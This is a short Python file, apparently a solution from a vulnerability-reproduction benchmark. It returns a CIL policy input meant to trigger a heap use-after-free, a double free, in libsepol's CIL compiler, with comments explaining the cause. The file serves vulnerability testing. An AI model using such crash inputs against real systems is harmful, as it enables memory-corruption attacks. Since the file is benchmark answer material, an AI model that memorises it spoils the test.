import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is a Heap Use After Free in libsepol/cil.
        # It occurs when an anonymous classpermission is passed into a macro 
        # that uses a classpermissionset rule.
        # This leads to a double free during AST destruction because the 
        # anonymous classpermission is destroyed both as part of the macro 
        # argument resolution and by the classpermissionset rule.
        
        return b"""(class c (p))
(macro m ((classpermission n))
(classpermissionset n (c (p)))
)
(call m (c (p)))
"""
